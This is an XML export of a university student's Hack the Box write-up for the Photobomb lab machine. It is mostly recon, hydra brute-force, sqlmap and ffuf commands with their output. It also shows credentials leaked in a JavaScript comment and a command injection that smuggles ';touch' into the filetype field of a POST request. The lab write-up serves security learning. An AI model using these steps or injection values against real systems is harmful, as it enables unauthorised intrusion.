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</office:automatic-styles>
  <office:body>
    <office:text>
      <text:p text:style-name="Title">Uni Hacking Report</text:p>
      <text:p text:style-name="Subtitle">Hack the Box: Photobomb Machine</text:p>
      <text:p text:style-name="Author">Felicitas Pojtinger (fp036</text:p>
      <text:p text:style-name="Author">Stuttgart Media University)</text:p>
      <text:p text:style-name="Date">2022-10-14</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="section"/><text:bookmark-end text:name="section"/></text:h>
      <text:p text:style-name="Abstract">Voluntary Hacking Report for Winter 2022/2023.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<text:span text:style-name="T1">Machine</text:span>: Photobomb (Medium; <text:span text:style-name="Source_Text">10.10.11.182</text:span>, https://app.hackthebox.com/machines/Photobomb)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"># /etc/hosts</text:p>
      <text:p text:style-name="P3">10.10.11.182 photobomb.htb$</text:p>
      <text:p text:style-name="P4">$ nmap -v -p- photobomb.htb</text:p>
      <text:p text:style-name="P5">Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 18:44 CEST</text:p>
      <text:p text:style-name="P6">Initiating Ping Scan at 18:44</text:p>
      <text:p text:style-name="P7">Scanning photobomb.htb (10.10.11.182) [2 ports]</text:p>
      <text:p text:style-name="P8">Completed Ping Scan at 18:44, 0.05s elapsed (1 total hosts)</text:p>
      <text:p text:style-name="P9">Initiating Connect Scan at 18:44</text:p>
      <text:p text:style-name="P10">Scanning photobomb.htb (10.10.11.182) [65535 ports]</text:p>
      <text:p text:style-name="P11">Discovered open port 80/tcp on 10.10.11.182</text:p>
      <text:p text:style-name="P12">Discovered open port 22/tcp on 10.10.11.182</text:p>
      <text:p text:style-name="P13">HTTP/1.1 200 OK</text:p>
      <text:p text:style-name="P14">Server: nginx/1.18.0 (Ubuntu)</text:p>
      <text:p text:style-name="P15">Date: Fri, 14 Oct 2022 16:48:11 GMT</text:p>
      <text:p text:style-name="P16">Content-Type: text/html;charset=utf-8</text:p>
      <text:p text:style-name="P17">Connection: close</text:p>
      <text:p text:style-name="P18">X-Xss-Protection: 1; mode=block</text:p>
      <text:p text:style-name="P19">X-Content-Type-Options: nosniff</text:p>
      <text:p text:style-name="P20">X-Frame-Options: SAMEORIGIN</text:p>
      <text:p text:style-name="P21">Content-Length: 843</text:p>
      <text:p text:style-name="P22">GET /printer HTTP/1.1</text:p>
      <text:p text:style-name="P23">Host: photobomb.htb</text:p>
      <text:p text:style-name="P24">Cache-Control: max-age=0</text:p>
      <text:p text:style-name="P25">Authorization: Basic YXNkZmFzZGY6c2FkZmFzZGY=</text:p>
      <text:p text:style-name="P26">Upgrade-Insecure-Requests: 1</text:p>
      <text:p text:style-name="P27">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36</text:p>
      <text:p text:style-name="P28">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</text:p>
      <text:p text:style-name="P29">Referer: http://photobomb.htb/</text:p>
      <text:p text:style-name="P30">Accept-Encoding: gzip, deflate</text:p>
      <text:p text:style-name="P31">Accept-Language: en-US,en;q=0.9</text:p>
      <text:p text:style-name="P32">Connection: close</text:p>
      <text:p text:style-name="P33">$ ffuf -w ~/Downloads/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://photobomb.htb/ -H 'Host: FUZZ.http://photobomb.htb/' -fs 0,154</text:p>
      <text:p text:style-name="P34"># No results</text:p>
      <text:p text:style-name="P35">$ ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://photobomb.htb/FUZZ -fs 12193 -s</text:p>
      <text:p text:style-name="P36"># directory-list-2.3-small.txt</text:p>
      <text:p text:style-name="P37"># or send a letter to Creative Commons, 171 Second Street,</text:p>
      <text:p text:style-name="P38">#</text:p>
      <text:p text:style-name="P39">#</text:p>
      <text:p text:style-name="P40"># Priority-ordered case-sensitive list, where entries were found</text:p>
      <text:p text:style-name="P41"># license, visit http://creativecommons.org/licenses/by-sa/3.0/</text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P43"># Suite 300, San Francisco, California, 94105, USA.</text:p>
      <text:p text:style-name="P44">#</text:p>
      <text:p text:style-name="P45"># on at least 3 different hosts</text:p>
      <text:p text:style-name="P46">#</text:p>
      <text:p text:style-name="P47"># Attribution-Share Alike 3.0 License. To view a copy of this</text:p>
      <text:p text:style-name="P48"># Copyright 2007 James Fisher</text:p>
      <text:p text:style-name="P49"># This work is licensed under the Creative Commons</text:p>
      <text:p text:style-name="P50">printer</text:p>
      <text:p text:style-name="P51">printers</text:p>
      <text:p text:style-name="P52">printerfriendly</text:p>
      <text:p text:style-name="P53">printer_friendly</text:p>
      <text:p text:style-name="P54">printer_icon</text:p>
      <text:p text:style-name="P55">printer-icon</text:p>
      <text:p text:style-name="P56">printer-friendly</text:p>
      <text:p text:style-name="P57">printerFriendly</text:p>
      <text:p text:style-name="P58">printersupplies</text:p>
      <text:p text:style-name="P59">printer1</text:p>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P61">printer2</text:p>
      <text:p text:style-name="P62"># ...</text:p>
      <text:p text:style-name="First_20_paragraph">4 4283 77468377 → Invalid number</text:p>
      <text:p text:style-name="P63">Sinatra doesn’t know this ditty.</text:p>
      <text:p text:style-name="P64"/>
      <text:p text:style-name="P65">Try this:</text:p>
      <text:p text:style-name="P66">get '/asdfsadfsdf' do</text:p>
      <text:p text:style-name="P67"><text:s text:c="2"/>"Hello World"</text:p>
      <text:p text:style-name="P68">end</text:p>
      <text:p text:style-name="First_20_paragraph">We have a Sinatra server.</text:p>
      <text:p text:style-name="P69">$ hydra -l username -P ~/Downloads/rockyou.txt -s 80 -f photobomb.htb http-get /printer</text:p>
      <text:p text:style-name="P70">sqlmap -u 'http://photobomb.htb/printer' --auth-type=basic --auth-cred=testuser:testpass --banner -v 5</text:p>
      <text:p text:style-name="P71">$ curl 'http://photobomb.htb/photobomb.js' \</text:p>
      <text:p text:style-name="P72"><text:s text:c="2"/>--compressed \</text:p>
      <text:p text:style-name="P73"><text:s text:c="2"/>--insecure</text:p>
      <text:p text:style-name="P74">function init() {</text:p>
      <text:p text:style-name="P75"><text:s text:c="2"/>// Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me</text:p>
      <text:p text:style-name="P76"><text:s text:c="2"/>if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {</text:p>
      <text:p text:style-name="P77"><text:s text:c="4"/>document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');</text:p>
      <text:p text:style-name="P78"><text:s text:c="2"/>}</text:p>
      <text:p text:style-name="P79">}</text:p>
      <text:p text:style-name="P80">window.onload = init;</text:p>
      <text:p text:style-name="First_20_paragraph">User: <text:span text:style-name="Source_Text">pH0t0</text:span> Password: <text:span text:style-name="Source_Text">b0Mb!</text:span></text:p>
      <text:p text:style-name="P81">$ curl 'http://photobomb.htb/printer' \</text:p>
      <text:p text:style-name="P82"><text:s text:c="2"/>-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \</text:p>
      <text:p text:style-name="P83"><text:s text:c="2"/>-H 'Accept-Language: en-US,en;q=0.9,de;q=0.8' \</text:p>
      <text:p text:style-name="P84"><text:s text:c="2"/>-H 'Authorization: Basic cEgwdDA6YjBNYiE=' \</text:p>
      <text:p text:style-name="P85"><text:s text:c="2"/>-H 'Cache-Control: max-age=0' \</text:p>
      <text:p text:style-name="P86"><text:s text:c="2"/>-H 'Connection: keep-alive' \</text:p>
      <text:p text:style-name="P87"><text:s text:c="2"/>-H 'Content-Type: application/x-www-form-urlencoded' \</text:p>
      <text:p text:style-name="P88"><text:s text:c="2"/>-H 'Origin: http://photobomb.htb' \</text:p>
      <text:p text:style-name="P89"><text:s text:c="2"/>-H 'Referer: http://photobomb.htb/printer' \</text:p>
      <text:p text:style-name="P90"><text:s text:c="2"/>-H 'Upgrade-Insecure-Requests: 1' \</text:p>
      <text:p text:style-name="P91"><text:s text:c="2"/>-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36' \</text:p>
      <text:p text:style-name="P92"><text:s text:c="2"/>--data-raw 'photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg&amp;dimensions=1000x1500' \</text:p>
      <text:p text:style-name="P93"><text:s text:c="2"/>--compressed \</text:p>
      <text:p text:style-name="P94"><text:s text:c="2"/>--insecure</text:p>
      <text:p text:style-name="P95">$ sqlmap -u 'http://photobomb.htb/printer' --data="photo=asdf" --method GET --dbs --batch -time-sec=1 --headers="Authorization: Basic cEgwdDA6YjBNYiE="</text:p>
      <text:p text:style-name="P96">[19:22:0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</text:p>
      <text:p text:style-name="P97">$ sqlmap -u 'http://photobomb.htb/printer' --data="filetype=asdf" --method GET --dbs --batch -time-sec=1 --headers="Authorization: Basic cEgwdDA6YjBNYiE="</text:p>
      <text:p text:style-name="P98">[19:22:3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'</text:p>
      <text:p text:style-name="First_20_paragraph">We can download files, so its probably a file inclusion. Where is the upload site? Let’s fuzz.</text:p>
      <text:p text:style-name="P99">$ ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://photobomb.htb/FUZZ -fs 12193 -s -H "Authorization: Basic cEgwdDA6YjBNYiE="</text:p>
      <text:p text:style-name="P100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voicu-apostol-MWER49YaD-M-unsplash.jpg&amp;filetype=jpg' <text:s text:c="2"/>--compressed <text:s text:c="2"/>--insecure &gt; /tmp/asdf.html</text:p>
      <text:p text:style-name="P101"># Shows error message with debug information and regex, repeat with other parameters</text:p>
      <text:p text:style-name="P102">post '/printer' do</text:p>
      <text:p text:style-name="P103"><text:s text:c="2"/>photo = params[:photo]</text:p>
      <text:p text:style-name="P104"><text:s text:c="2"/>filetype = params[:filetype]</text:p>
      <text:p text:style-name="P105"><text:s text:c="2"/>dimensions = params[:dimensions]</text:p>
      <text:p text:style-name="P106"/>
      <text:p text:style-name="P107"><text:s text:c="2"/># handle inputs</text:p>
      <text:p text:style-name="P108"><text:s text:c="2"/>if photo.match(/\.{2}|\//)</text:p>
      <text:p text:style-name="P109"><text:s text:c="4"/>halt 500, 'Invalid photo.'</text:p>
      <text:p text:style-name="P110"><text:s text:c="2"/>end</text:p>
      <text:p text:style-name="P111"/>
      <text:p text:style-name="P112"><text:s text:c="2"/>if !FileTest.exist?( "source_images/" + photo )</text:p>
      <text:p text:style-name="P113"><text:s text:c="4"/>halt 500, 'Source photo does not exist.'</text:p>
      <text:p text:style-name="P114"><text:s text:c="2"/>end</text:p>
      <text:p text:style-name="P115"/>
      <text:p text:style-name="P116"/>
      <text:p text:style-name="P117"><text:s text:c="2"/>if !filetype.match(/^(png|jpg)/)</text:p>
      <text:p text:style-name="P118"><text:s text:c="4"/>halt 500, 'Invalid filetype.'</text:p>
      <text:p text:style-name="P119"><text:s text:c="2"/>end</text:p>
      <text:p text:style-name="P120"/>
      <text:p text:style-name="P121"><text:s text:c="2"/>if !dimensions.match(/^[0-9]+x[0-9]+$/)</text:p>
      <text:p text:style-name="P122"><text:s text:c="4"/>halt 500, 'Invalid dimensions.'</text:p>
      <text:p text:style-name="P123"><text:s text:c="2"/>end</text:p>
      <text:p text:style-name="P124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wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&amp;filetype=jpg;touch asdf-3000x2000.jpg&amp;dimensions=3000x2000' <text:s text:c="2"/>--compressed <text:s text:c="2"/>--insecure -vvv</text:p>
      <text:p text:style-name="P125">* <text:s text:c="2"/>Trying 10.10.11.182:80...</text:p>
      <text:p text:style-name="P126">* Connected to photobomb.htb (10.10.11.182) port 80 (#0)</text:p>
      <text:p text:style-name="P127">&gt; POST /printer HTTP/1.1</text:p>
      <text:p text:style-name="P128">&gt; Host: photobomb.htb</text:p>
      <text:p text:style-name="P129">&gt; Accept-Encoding: deflate, gzip, br, zstd</text:p>
      <text:p text:style-name="P130">&gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</text:p>
      <text:p text:style-name="P131">&gt; Accept-Language: en-US,en;q=0.9,de;q=0.8</text:p>
      <text:p text:style-name="P132">&gt; Authorization: Basic cEgwdDA6YjBNYiE=</text:p>
      <text:p text:style-name="P133">&gt; Cache-Control: max-age=0</text:p>
      <text:p text:style-name="P134">&gt; Connection: keep-alive</text:p>
      <text:p text:style-name="P135">&gt; Content-Type: application/x-www-form-urlencoded</text:p>
      <text:p text:style-name="P136">&gt; Origin: http://photobomb.htb</text:p>
      <text:p text:style-name="P137">&gt; Referer: http://photobomb.htb/printer</text:p>
      <text:p text:style-name="P138">&gt; Upgrade-Insecure-Requests: 1</text:p>
      <text:p text:style-name="P139">&gt; User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</text:p>
      <text:p text:style-name="P140">&gt; Content-Length: 109</text:p>
      <text:p text:style-name="P141">&gt;</text:p>
      <text:p text:style-name="P142">* Mark bundle as not supporting multiuse</text:p>
      <text:p text:style-name="P143">&lt; HTTP/1.1 500 Internal Server Error</text:p>
      <text:p text:style-name="P144">&lt; Server: nginx/1.18.0 (Ubuntu)</text:p>
      <text:p text:style-name="P145">&lt; Date: Fri, 14 Oct 2022 18:18:18 GMT</text:p>
      <text:p text:style-name="P146">&lt; Content-Type: text/html;charset=utf-8</text:p>
      <text:p text:style-name="P147">&lt; Content-Length: 73</text:p>
      <text:p text:style-name="P148">&lt; Connection: keep-alive</text:p>
      <text:p text:style-name="P149">&lt; Content-Disposition: attachment; filename=wolfgang-hasselmann-RLEgmd1O7gs-unsplash_3000x2000.jpg;touch asdf-3000x2000.jpg</text:p>
      <text:p text:style-name="P150">&lt; X-Xss-Protection: 1; mode=block</text:p>
      <text:p text:style-name="P151">&lt; X-Content-Type-Options: nosniff</text:p>
      <text:p text:style-name="P152">&lt; X-Frame-Options: SAMEORIGIN</text:p>
      <text:p text:style-name="P153">&lt;</text:p>
      <text:p text:style-name="P154">* Connection #0 to host photobomb.htb left intact</text:p>
      <text:p text:style-name="P155">Failed to generate a copy of wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg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acking Report</dc:title>
    <dc:description/>
    <dc:subject>Hacking Report</dc:subject>
    <meta:keyword>hdm-stuttgart, hacking</meta:keyword>
    <dc:language>en-US</dc:language>
    <meta:initial-creator>Felicitas Pojtinger (fp036; Stuttgart Media University)</meta:initial-creator>
    <dc:creator>Felicitas Pojtinger (fp036; Stuttgart Media University)</dc:creator>
    <meta:creation-date>2023-07-30T00:23:49Z</meta:creation-date>
    <dc:date>2023-07-30T00:23:49Z</dc:date>
    <meta:user-defined meta:name="abstract" meta:value-type="string">Voluntary Hacking Report for Winter 2022/2023.</meta:user-defined>
    <meta:user-defined meta:name="csl" meta:value-type="string">static/ieee.csl</meta:user-defined>
    <meta:user-defined meta:name="date" meta:value-type="string">2022-10-14</meta:user-defined>
    <meta:user-defined meta:name="linkcolor" meta:value-type="string">blue</meta:user-defined>
    <meta:user-defined meta:name="subtitle" meta:value-type="string">Hack the Box: Photobomb Machin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